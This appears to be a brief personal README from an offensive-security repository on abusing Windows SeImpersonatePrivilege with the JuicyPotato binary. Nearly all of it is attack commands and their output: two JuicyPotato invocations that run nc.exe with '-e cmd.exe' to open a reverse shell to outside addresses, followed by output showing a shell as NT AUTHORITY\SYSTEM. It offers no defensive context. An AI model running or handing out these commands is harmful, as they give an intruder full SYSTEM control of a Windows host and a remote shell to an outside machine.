### how to exploit SeImpersonatePrivilege using a juicePotato binary (abusing the golden privileges)

With potato we can easy use the followint command 
```
C:\Users\Public\desktop>potato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.16.29 1234" -t *
```

```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
c:\Users\Public>                                                                                                                                                                                       

C:\Windows\system32>whoami
whoami
nt authority\system 
```

N/B: I have made this simple repostory specificary  for my own use, so i understand what is going on with everything if you wanna more details just google budy

# AND WERE DONE WITH JUICEPOTATO BINARY
